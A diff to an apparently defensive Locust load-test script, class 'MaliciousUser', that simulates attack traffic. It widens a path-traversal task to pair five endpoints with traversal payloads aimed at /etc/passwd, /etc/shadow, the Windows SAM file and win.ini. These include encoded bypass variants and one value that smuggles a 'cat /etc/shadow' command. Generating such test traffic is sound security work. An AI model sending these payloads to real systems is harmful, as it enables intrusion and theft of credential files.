@@ -87,15 +87,31 @@ class MaliciousUser(FastHttpUser):
 
     @task(1)
     def path_traversal_attempt(self):
-        payloads = [
+
+        choice = random.randint(1,3)
+
+        firstpayloads = [
+            "/download?filename=",
+            "/load_config?path=",
+            "/static/",
+            "/document?file=",
+            "/show_image?img=",
+        ]
+
+        secondpayloads = [
             "../../../etc/passwd",
             "..\\..\\..\\windows\\win.ini",
+            "..\\..\\..\\..\\windows\\system32\\config\\SAM",
             "....//....//....//etc/hosts",
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
             "..%252f..%252f..%252fetc%252fpasswd",
+            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+            "..\\..//..\\..//etc/passwd",
+            "../../../../bin/bash|cat /etc/shadow",
         ]
-        payload = random.choice(payloads)
-        self._log_request("GET", f"/static/{payload}", None, "path_traversal")
+        for firstpayload in firstpayloads:
+            for secondpayload in secondpayloads:
+                self._log_request("GET", f"{firstpayload}{secondpayload}", None, "path_traversal")
 
     @task(1)
     def command_injection_attempt(self):
@@ -118,10 +134,10 @@ class MaliciousUser(FastHttpUser):
     @task(2)
     def ddos_simulation(self):
 
-        randomuser = random.randint(1,2)
+        choice = random.randint(1,2)
         for _ in range(random.randint(5, 15)):
             # Randomize user_id, session_id, client_ip, and user_agent
-            if randomuser == 1:
+            if choice == 1:
                 self.randomuser()
 
             actions = [
